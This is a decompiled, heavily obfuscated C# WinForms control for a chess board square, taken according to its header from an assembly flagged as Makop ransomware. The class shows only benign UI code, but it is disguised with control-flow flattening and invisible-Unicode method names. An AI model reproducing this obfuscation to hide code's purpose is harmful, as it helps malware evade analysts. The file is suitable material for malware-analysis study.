// Decompiled with JetBrains decompiler
// Type: SimpleChessApp.Game.SimpleSquare
// Assembly: p的, Version=2.159.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E9517A17-41D2-4860-BC69-C7D574C89AF9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.MSIL.Makop.gen-9548c6a9da2d6cee9d27565c0055be4429cabfae9287ab3e525aaba66fd67032.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace SimpleChessApp.Game
{
  public class SimpleSquare : UserControl
  {
    private Color DefaultColor;
    private ChessPiece piece;
    private bool isBlackSquare;
    private IContainer components = (IContainer) null;
    public Panel panel1;

    public event EventHandler<MouseEventArgs> Click
    {
      add
      {
        EventHandler<MouseEventArgs> eventHandler1 = this.Click;
label_1:
        int num1 = -839191528;
        EventHandler<MouseEventArgs> comparand;
        EventHandler<MouseEventArgs> eventHandler2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -191039448)) % 5U)
          {
            case 0:
              eventHandler1 = Interlocked.CompareExchange<EventHandler<MouseEventArgs>>(ref this.Click, eventHandler2, comparand);
              int num3 = eventHandler1 == comparand ? 1503043361 : (num3 = 538031046);
              num1 = num3 ^ (int) num2 * -787126305;
              continue;
            case 1:
              goto label_3;
            case 2:
              eventHandler2 = (EventHandler<MouseEventArgs>) SimpleSquare.\u200D‏‎⁬‮​‫⁯⁫‍‍​‌⁯‮⁪‍‭‌⁪⁫‌‫‮⁮⁭⁫⁭‪⁯‏‍‬‏‏⁭‫‫‪⁯‮((Delegate) comparand, (Delegate) value);
              num1 = (int) num2 * -1523548897 ^ 933952322;
              continue;
            case 3:
              goto label_1;
            case 4:
              comparand = eventHandler1;
              num1 = -1032214960;
              continue;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:;
      }
      remove
      {
        EventHandler<MouseEventArgs> eventHandler1 = this.Click;
label_1:
        int num1 = -1714130286;
        EventHandler<MouseEventArgs> comparand;
        EventHandler<MouseEventArgs> eventHandler2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -481977469)) % 6U)
          {
            case 0:
              int num3 = eventHandler1 != comparand ? -526399170 : (num3 = -287400161);
              num1 = num3 ^ (int) num2 * 575670454;
              continue;
            case 1:
              comparand = eventHandler1;
              num1 = -127011414;
              continue;
            case 2:
              goto label_3;
            case 3:
              eventHandler1 = Interlocked.CompareExchange<EventHandler<MouseEventArgs>>(ref this.Click, eventHandler2, comparand);
              num1 = (int) num2 * 407008911 ^ -1442505376;
              continue;
            case 4:
              goto label_1;
            case 5:
              eventHandler2 = (EventHandler<MouseEventArgs>) SimpleSquare.\u206F⁮‍​⁫⁪⁪⁪‍⁯⁪‍‪⁯‮‌⁫⁪⁮⁬⁭‪⁬⁬‍⁯‪⁮⁪‎⁬​⁮‪⁬⁪​‬‪⁪‮((Delegate) comparand, (Delegate) value);
              num1 = (int) num2 * -1250188893 ^ 478828151;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    public ChessPiece Piece
    {
      get
      {
label_1:
        int num1 = 834181386;
        ChessPiece piece;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 2134618075)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              piece = this.piece;
              num1 = (int) num2 * 1844592354 ^ -263634428;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return piece;
      }
      set
      {
label_1:
        int num1 = -129847153;
        bool flag;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1286487251)) % 10U)
          {
            case 0:
              goto label_3;
            case 1:
              int num3 = !flag ? -727663509 : (num3 = -1964676469);
              num1 = num3 ^ (int) num2 * 1674722526;
              continue;
            case 2:
              goto label_1;
            case 3:
              this.piece = (ChessPiece) null;
              SimpleSquare.\u202E‍‫⁫⁫⁪‎‪⁪‏⁮‭⁭‍‪⁮​⁪​‪‬‪⁮​⁬⁫‎‫‌‮‎‍‮⁯⁪⁪⁬⁬‭⁬‮((Control) this, (Image) null);
              num1 = (int) num2 * -625313027 ^ 773863261;
              continue;
            case 4:
              SimpleSquare.\u202E‍‫⁫⁫⁪‎‪⁪‏⁮‭⁭‍‪⁮​⁪​‪‬‪⁮​⁬⁫‎‫‌‮‎‍‮⁯⁪⁪⁬⁬‭⁬‮((Control) this, this.repo.GetPiece(this.piece.Kind, this.piece.Color));
              num1 = -1638262944;
              continue;
            case 5:
              num1 = (int) num2 * -1714936240 ^ 776798169;
              continue;
            case 6:
              this.piece = value;
              num1 = (int) num2 * 1517525276 ^ 1145917462;
              continue;
            case 7:
              num1 = (int) num2 * 1198953948 ^ 1691923197;
              continue;
            case 8:
              num1 = (int) num2 * -235812705 ^ 1253316466;
              continue;
            case 9:
              flag = this.piece == null;
              num1 = (int) num2 * 406575958 ^ 958329638;
              continue;
            default:
              goto label_12;
          }
        }
label_3:
        return;
label_12:;
      }
    }

    public void colorSquare()
    {
      this.DefaultColor = this.IsBlackSquare ? Color.CornflowerBlue : Color.WhiteSmoke;
      SimpleSquare.\u202D‌⁬‏⁪‏‌⁯‎⁭‭⁫⁭‭⁬‪⁯⁪‭⁬⁮⁪‬⁭​‪⁬‫‭⁪⁪‫​‏‫‫‫‮⁭‏‮((Control) this, this.DefaultColor);
label_1:
      int num1 = -1920997066;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -530441326)) % 3U)
        {
          case 0:
            goto label_3;
          case 1:
            num1 = (int) num2 * -1775500576 ^ 1719319819;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public Pieces Kind
    {
      set
      {
        this.Piece.Kind = value;
label_1:
        int num1 = 1641597615;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1443845593)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              this.Piece = this.Piece;
              num1 = (int) num2 * -720572116 ^ 1852132668;
              continue;
            case 2:
              goto label_3;
            default:
              goto label_5;
          }
        }
label_3:
        return;
label_5:;
      }
    }

    public bool IsBlackSquare
    {
      get
      {
        bool isBlackSquare = this.isBlackSquare;
label_1:
        int num1 = 1592115075;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1838306339)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              num1 = (int) num2 * 36904965 ^ 77674433;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return isBlackSquare;
      }
      set
      {
label_1:
        int num1 = 2036266540;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1892335084)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              this.isBlackSquare = value;
              num1 = (int) num2 * -1232818467 ^ -909266944;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        this.colorSquare();
      }
    }

    public Repository repo
    {
      get
      {
        Repository repo = ChessContext.repo;
label_1:
        int num1 = -1254013905;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1589374643)) % 3U)
          {
            case 1:
              num1 = (int) num2 * 1792877759 ^ 919516586;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_4;
          }
        }
label_4:
        return repo;
      }
    }

    public SimpleSquare()
    {
label_1:
      int num1 = -1393929169;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -162874408)) % 9U)
        {
          case 0:
            goto label_3;
          case 1:
            num1 = (int) num2 * 681656896 ^ 1685142015;
            continue;
          case 2:
            num1 = (int) num2 * 542035809 ^ 557929957;
            continue;
          case 3:
            goto label_1;
          case 4:
            this.InitializeComponent();
            num1 = (int) num2 * 669297536 ^ -268147124;
            continue;
          case 5:
            SimpleSquare.\u202E⁮⁭‬‫⁬‭‎‏‬‏⁮‪‪‌⁭‬⁮‮⁯‍‭‭‎‮‌⁪‭‎‍‎‪‌​⁬⁫‭‪‭‏‮((Control) this, new MouseEventHandler(this.Square_MouseClick));
            num1 = (int) num2 * -1799160423 ^ -709946238;
            continue;
          case 6:
            num1 = (int) num2 * 1649703430 ^ -473228053;
            continue;
          case 7:
            num1 = (int) num2 * 942280376 ^ 243736507;
            continue;
          case 8:
            SimpleSquare.\u202E⁫‮⁬‬‎⁫⁮‭⁮‏⁫‮‫‌‭‎⁬‪⁬‪⁬⁪⁪​‎‍⁬‎‭⁫‭‌​‬⁮‏⁮‎⁮‮((Control) this.panel1, new MouseEventHandler(this.Square_MouseClick));
            num1 = (int) num2 * -239009567 ^ 1375033256;
            continue;
          default:
            goto label_11;
        }
      }
label_3:
      return;
label_11:;
    }

    private void Square_MouseClick(object sender, MouseEventArgs e)
    {
      EventHandler<MouseEventArgs> click = this.Click;
      if (click == null)
        return;
      click((object) this, e);
label_3:
      int num1 = -1013353533;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1108445700)) % 3U)
        {
          case 0:
            goto label_3;
          case 1:
            goto label_6;
          case 2:
            num1 = (int) num2 * 1664208249 ^ 2140879902;
            continue;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    public void HighLight() => SimpleSquare.\u202D‌⁬‏⁪‏‌⁯‎⁭‭⁫⁭‭⁬‪⁯⁪‭⁬⁮⁪‬⁭​‪⁬‫‭⁪⁪‫​‏‫‫‫‮⁭‏‮((Control) this, Color.ForestGreen);

    public void ClearHighLight()
    {
label_1:
      int num1 = -1139434986;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1110036452)) % 3U)
        {
          case 0:
            goto label_3;
          case 1:
            SimpleSquare.\u202D‌⁬‏⁪‏‌⁯‎⁭‭⁫⁭‭⁬‪⁯⁪‭⁬⁮⁪‬⁭​‪⁬‫‭⁪⁪‫​‏‫‫‫‮⁭‏‮((Control) this, this.DefaultColor);
            num1 = (int) num2 * 914174405 ^ 1037359554;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public bool IsEmpty
    {
      get
      {
label_1:
        int num1 = -1222230461;
        bool isEmpty;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -386672190)) % 4U)
          {
            case 0:
              num1 = (int) num2 * -7808369 ^ -423924443;
              continue;
            case 1:
              isEmpty = this.Piece == null;
              num1 = (int) num2 * -1043773749 ^ 588592673;
              continue;
            case 2:
              goto label_1;
            default:
              goto label_5;
          }
        }
label_5:
        return isEmpty;
      }
    }

    protected override void Dispose(bool disposing)
    {
label_1:
      int num1 = -419893254;
      while (true)
      {
        uint num2;
        int num3;
        switch ((num2 = (uint) (num1 ^ -231578683)) % 8U)
        {
          case 0:
            goto label_1;
          case 1:
            SimpleSquare.\u202C⁪⁮⁪⁬‪‏‭‫⁮⁫⁭​⁬‍‪⁪‍‬‫‪⁯‪‍⁪‌‏‎⁫‍‬⁬‪​⁫⁮‍‌⁪‬‮((IDisposable) this.components);
            num1 = (int) num2 * -732458540 ^ -558185182;
            continue;
          case 2:
            goto label_3;
          case 3:
            num1 = (int) num2 * 804185875 ^ 1844449594;
            continue;
          case 4:
            num3 = this.components != null ? 1 : 0;
            break;
          case 5:
            num1 = (int) num2 * -460555204 ^ -358081208;
            continue;
          case 6:
            base.Dispose(disposing);
            num1 = -392999489;
            continue;
          case 7:
            if (disposing)
            {
              num1 = (int) num2 * -1819755293 ^ 885940988;
              continue;
            }
            num3 = 0;
            break;
          default:
            goto label_13;
        }
        int num4;
        num1 = num4 = num3 == 0 ? -1335211021 : (num4 = -1078855688);
      }
label_3:
      return;
label_13:;
    }

    private void InitializeComponent()
    {
label_1:
      int num1 = 722372362;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1559770127)) % 23U)
        {
          case 0:
            SimpleSquare.\u206A⁮‏‮⁪‬⁪‍‏‎‍​‫⁬‮‏⁯‬‪⁮⁮⁬‫‪⁪‫‏‍​‌‎​‍‌⁬‭‍⁬⁯‏‮((Control) this.panel1, ImageLayout.Center);
            num1 = (int) num2 * 496227261 ^ 960360726;
            continue;
          case 1:
            goto label_3;
          case 2:
            SimpleSquare.\u206D‎⁯⁫‏‍​‍⁫​​‭​‫⁪‬⁮‫​⁬‭‮⁬‎⁯⁬⁪⁬‎‍‫‎⁮‌⁯⁬​‬⁪⁫‮((Control) this, new Size(137, 132));
            num1 = (int) num2 * 1654308617 ^ 577698518;
            continue;
          case 3:
            num1 = (int) num2 * 1621429747 ^ -230995216;
            continue;
          case 4:
            SimpleSquare.\u200E‭‍‍‏​‮⁬‮‬‌⁫‎⁯⁫‌⁮‪⁫‎‏‭‍‎‭⁪⁭⁫‌⁯‬‭‬‏⁯⁯⁫‎‮‪‮((Control) this.panel1, DockStyle.Fill);
            num1 = (int) num2 * 1612824502 ^ -1957645182;
            continue;
          case 5:
            num1 = (int) num2 * 46245034 ^ 1127694547;
            continue;
          case 6:
            num1 = (int) num2 * 1457720652 ^ 130230202;
            continue;
          case 7:
            SimpleSquare.\u202E​⁮⁯⁮‮‍‌‌⁮‬⁮‬⁫‪‮‪​‏‫‭⁯‌⁬⁪⁭‬⁯​⁫‌​⁫‬​‎⁬‌⁪⁬‮((Control) this, new Padding(0));
            num1 = (int) num2 * -2135823514 ^ -1191767115;
            continue;
          case 8:
            SimpleSquare.\u202D‌⁬‏⁪‏‌⁯‎⁭‭⁫⁭‭⁬‪⁯⁪‭⁬⁮⁪‬⁭​‪⁬‫‭⁪⁪‫​‏‫‫‫‮⁭‏‮((Control) this.panel1, Color.Transparent);
            num1 = (int) num2 * 828558982 ^ 1149726376;
            continue;
          case 9:
            SimpleSquare.\u200B‎‭‌‪‮‌⁮‏‎‍‫‎​‪⁮‮⁬​‏‏‫‬‎‎‏⁪⁮‌‪‏‏‏⁭‮⁮‫⁫‭⁯‮((Control) this, false);
            num1 = (int) num2 * -394617344 ^ 1550846228;
            continue;
          case 10:
            SimpleSquare.\u202A⁮‏‫‮‭‬⁭⁯⁪‎‍‬‏⁫⁪‍‮‬‏⁮‏‏‬⁮‌​⁭‍⁫‬⁫‎⁯⁫‍‌​‬‪‮(SimpleSquare.\u200E‮‬⁯‮‮‪⁯‏⁪‭‏‭⁯‮⁪​⁬⁬⁮‬​​​‍⁬⁫‬‪‏​‭‏‏‏‍‬‪​‭‮((Control) this), (Control) this.panel1);
            num1 = (int) num2 * -1805670617 ^ 1234136978;
            continue;
          case 11:
            num1 = (int) num2 * -985036652 ^ 1174617867;
            continue;
          case 12:
            this.panel1 = SimpleSquare.\u206B⁪‫‮‪‬‮‭‫⁪‍⁭‬⁫‬​⁯⁫‮‫‭‌⁬‌‍‫‏⁯⁪⁮‍‮‌⁪‭⁫⁫‍⁯⁪‮();
            num1 = (int) num2 * -1580724511 ^ -772722209;
            continue;
          case 13:
            num1 = (int) num2 * -2067793616 ^ 877768215;
            continue;
          case 14:
            num1 = (int) num2 * 106359548 ^ -901414280;
            continue;
          case 15:
            SimpleSquare.\u202A​‮‪⁫‌⁬⁭⁬⁯‬‬⁪‭‮⁬‎‪⁮⁪⁮⁮⁬‭‮⁪⁪⁭‫⁬‎‮⁮‪‌⁪‭‭‎‭‮((Control) this.panel1, new Point(0, 0));
            num1 = (int) num2 * 439877688 ^ -974373315;
            continue;
          case 16:
            SimpleSquare.\u200C‪​​⁫⁭⁬⁮‪⁭‬‫‍‎‭‍⁯‍⁪⁭⁮‎‌‮⁪⁯‭⁭‫⁯⁭‮‬⁮⁯‌⁬⁮‪‪‮((Control) this);
            num1 = (int) num2 * 170393392 ^ 460633950;
            continue;
          case 17:
            SimpleSquare.\u202D‌⁮​‪‪‮‭‍‭‮‮‍‫‭⁬‭⁮‬‫‏‍‌‌‬‏⁭‏⁫‪‌⁭​⁯‌⁫⁫‪‮⁪‮((Control) this.panel1, 0);
            SimpleSquare.\u206B⁭‫‭‬⁭‎​​⁬⁪‬‮‍‪‮‎‍⁯⁬⁮‎‪⁫⁬⁫‎‬‪‍‍‮‭‮​⁮​‪‍‏‮((ContainerControl) this, new SizeF(6f, 13f));
            SimpleSquare.\u206A​‫‬‌⁮‎‪​‭‬‫‏‍‏⁭‍‫‮‬‪⁪​‎⁬‌‏‫⁭​‎‮‮⁭⁯⁯‌⁭‭‮‮((ContainerControl) this, AutoScaleMode.Font);
            SimpleSquare.\u206A⁮‏‮⁪‬⁪‍‏‎‍​‫⁬‮‏⁯‬‪⁮⁮⁬‫‪⁪‫‏‍​‌‎​‍‌⁬‭‍⁬⁯‏‮((Control) this, ImageLayout.Center);
            num1 = (int) num2 * -2034901877 ^ -955358120;
            continue;
          case 18:
            SimpleSquare.\u200E⁬‌‬⁯‌‫⁮‪‬‭⁭‬‭‫‫‫‫‮⁮‮‫⁭⁫⁫‫‭⁬⁮⁬‭⁬⁫⁯⁫⁪‫⁯‭‮‮((Control) this.panel1, \u003CModule\u003E.\u206D‏⁯‬‫‫‍⁭‬‪⁪‪‌‭‭‪‎⁮‭‌‍‭‏⁪​‎‭‏‪‍⁫⁭‏⁯‏⁯⁫‮⁬‮‮<string>(1364207428U));
            SimpleSquare.\u200B‎‏‏‭​​‪⁪⁪⁫‎‏‌⁫​‎‍⁮‭⁮⁭‌⁮‌‪​‫⁫‬‍‮⁫‬⁪⁮⁪⁭‭⁭‮((Control) this.panel1, new Size(137, 132));
            num1 = (int) num2 * 422915109 ^ 1686182032;
            continue;
          case 19:
            num1 = (int) num2 * -1999895683 ^ -1349009971;
            continue;
          case 20:
            num1 = (int) num2 * 1500226583 ^ -1472376156;
            continue;
          case 21:
            goto label_1;
          case 22:
            SimpleSquare.\u202C‍⁫⁮⁭‪‫‏‫⁫⁬​‫⁯‌⁮​⁮‫‫​⁯‫⁭⁮⁬⁬⁯⁭‫‬‎‮‍‮​‎‭⁫‌‮((Control) this, \u003CModule\u003E.\u206C‍‎‫‬⁯‫⁭‍‪‭⁮​‍‌‏‌⁮⁭⁮⁬​⁭‭⁪⁭‍⁮⁯⁮⁯⁮‏‭⁭‫‮⁬‭‫‮<string>(1474186587U));
            num1 = (int) num2 * 1323306984 ^ 614624826;
            continue;
          default:
            goto label_25;
        }
      }
label_3:
      return;
label_25:;
    }

    static Delegate \u200D‏‎⁬‮​‫⁯⁫‍‍​‌⁯‮⁪‍‭‌⁪⁫‌‫‮⁮⁭⁫⁭‪⁯‏‍‬‏‏⁭‫‫‪⁯‮(
      [In] Delegate obj0,
      [In] Delegate obj1)
    {
      return Delegate.Combine(obj0, obj1);
    }

    static Delegate \u206F⁮‍​⁫⁪⁪⁪‍⁯⁪‍‪⁯‮‌⁫⁪⁮⁬⁭‪⁬⁬‍⁯‪⁮⁪‎⁬​⁮‪⁬⁪​‬‪⁪‮(
      [In] Delegate obj0,
      [In] Delegate obj1)
    {
      return Delegate.Remove(obj0, obj1);
    }

    static void \u202E‍‫⁫⁫⁪‎‪⁪‏⁮‭⁭‍‪⁮​⁪​‪‬‪⁮​⁬⁫‎‫‌‮‎‍‮⁯⁪⁪⁬⁬‭⁬‮([In] Control obj0, [In] Image obj1) => obj0.BackgroundImage = obj1;

    static void \u202D‌⁬‏⁪‏‌⁯‎⁭‭⁫⁭‭⁬‪⁯⁪‭⁬⁮⁪‬⁭​‪⁬‫‭⁪⁪‫​‏‫‫‫‮⁭‏‮([In] Control obj0, [In] Color obj1) => obj0.BackColor = obj1;

    static void \u202E⁮⁭‬‫⁬‭‎‏‬‏⁮‪‪‌⁭‬⁮‮⁯‍‭‭‎‮‌⁪‭‎‍‎‪‌​⁬⁫‭‪‭‏‮([In] Control obj0, [In] MouseEventHandler obj1) => obj0.MouseClick += obj1;

    static void \u202E⁫‮⁬‬‎⁫⁮‭⁮‏⁫‮‫‌‭‎⁬‪⁬‪⁬⁪⁪​‎‍⁬‎‭⁫‭‌​‬⁮‏⁮‎⁮‮([In] Control obj0, [In] MouseEventHandler obj1) => obj0.MouseClick += obj1;

    static void \u202C⁪⁮⁪⁬‪‏‭‫⁮⁫⁭​⁬‍‪⁪‍‬‫‪⁯‪‍⁪‌‏‎⁫‍‬⁬‪​⁫⁮‍‌⁪‬‮([In] IDisposable obj0) => obj0.Dispose();

    static Panel \u206B⁪‫‮‪‬‮‭‫⁪‍⁭‬⁫‬​⁯⁫‮‫‭‌⁬‌‍‫‏⁯⁪⁮‍‮‌⁪‭⁫⁫‍⁯⁪‮() => new Panel();

    static void \u200C‪​​⁫⁭⁬⁮‪⁭‬‫‍‎‭‍⁯‍⁪⁭⁮‎‌‮⁪⁯‭⁭‫⁯⁭‮‬⁮⁯‌⁬⁮‪‪‮([In] Control obj0) => obj0.SuspendLayout();

    static void \u206A⁮‏‮⁪‬⁪‍‏‎‍​‫⁬‮‏⁯‬‪⁮⁮⁬‫‪⁪‫‏‍​‌‎​‍‌⁬‭‍⁬⁯‏‮([In] Control obj0, [In] ImageLayout obj1) => obj0.BackgroundImageLayout = obj1;

    static void \u200E‭‍‍‏​‮⁬‮‬‌⁫‎⁯⁫‌⁮‪⁫‎‏‭‍‎‭⁪⁭⁫‌⁯‬‭‬‏⁯⁯⁫‎‮‪‮([In] Control obj0, [In] DockStyle obj1) => obj0.Dock = obj1;

    static void \u202A​‮‪⁫‌⁬⁭⁬⁯‬‬⁪‭‮⁬‎‪⁮⁪⁮⁮⁬‭‮⁪⁪⁭‫⁬‎‮⁮‪‌⁪‭‭‎‭‮([In] Control obj0, [In] Point obj1) => obj0.Location = obj1;

    static void \u200E⁬‌‬⁯‌‫⁮‪‬‭⁭‬‭‫‫‫‫‮⁮‮‫⁭⁫⁫‫‭⁬⁮⁬‭⁬⁫⁯⁫⁪‫⁯‭‮‮([In] Control obj0, [In] string obj1) => obj0.Name = obj1;

    static void \u200B‎‏‏‭​​‪⁪⁪⁫‎‏‌⁫​‎‍⁮‭⁮⁭‌⁮‌‪​‫⁫‬‍‮⁫‬⁪⁮⁪⁭‭⁭‮([In] Control obj0, [In] Size obj1) => obj0.Size = obj1;

    static void \u202D‌⁮​‪‪‮‭‍‭‮‮‍‫‭⁬‭⁮‬‫‏‍‌‌‬‏⁭‏⁫‪‌⁭​⁯‌⁫⁫‪‮⁪‮([In] Control obj0, [In] int obj1) => obj0.TabIndex = obj1;

    static void \u206B⁭‫‭‬⁭‎​​⁬⁪‬‮‍‪‮‎‍⁯⁬⁮‎‪⁫⁬⁫‎‬‪‍‍‮‭‮​⁮​‪‍‏‮([In] ContainerControl obj0, [In] SizeF obj1) => obj0.AutoScaleDimensions = obj1;

    static void \u206A​‫‬‌⁮‎‪​‭‬‫‏‍‏⁭‍‫‮‬‪⁪​‎⁬‌‏‫⁭​‎‮‮⁭⁯⁯‌⁭‭‮‮(
      [In] ContainerControl obj0,
      [In] AutoScaleMode obj1)
    {
      obj0.AutoScaleMode = obj1;
    }

    static Control.ControlCollection \u200E‮‬⁯‮‮‪⁯‏⁪‭‏‭⁯‮⁪​⁬⁬⁮‬​​​‍⁬⁫‬‪‏​‭‏‏‏‍‬‪​‭‮(
      [In] Control obj0)
    {
      return obj0.Controls;
    }

    static void \u202A⁮‏‫‮‭‬⁭⁯⁪‎‍‬‏⁫⁪‍‮‬‏⁮‏‏‬⁮‌​⁭‍⁫‬⁫‎⁯⁫‍‌​‬‪‮(
      [In] Control.ControlCollection obj0,
      [In] Control obj1)
    {
      obj0.Add(obj1);
    }

    static void \u202E​⁮⁯⁮‮‍‌‌⁮‬⁮‬⁫‪‮‪​‏‫‭⁯‌⁬⁪⁭‬⁯​⁫‌​⁫‬​‎⁬‌⁪⁬‮([In] Control obj0, [In] Padding obj1) => obj0.Margin = obj1;

    static void \u202C‍⁫⁮⁭‪‫‏‫⁫⁬​‫⁯‌⁮​⁮‫‫​⁯‫⁭⁮⁬⁬⁯⁭‫‬‎‮‍‮​‎‭⁫‌‮([In] Control obj0, [In] string obj1) => obj0.Name = obj1;

    static void \u206D‎⁯⁫‏‍​‍⁫​​‭​‫⁪‬⁮‫​⁬‭‮⁬‎⁯⁬⁪⁬‎‍‫‎⁮‌⁯⁬​‬⁪⁫‮([In] Control obj0, [In] Size obj1) => obj0.Size = obj1;

    static void \u200B‎‭‌‪‮‌⁮‏‎‍‫‎​‪⁮‮⁬​‏‏‫‬‎‎‏⁪⁮‌‪‏‏‏⁭‮⁮‫⁫‭⁯‮([In] Control obj0, [In] bool obj1) => obj0.ResumeLayout(obj1);
  }
}
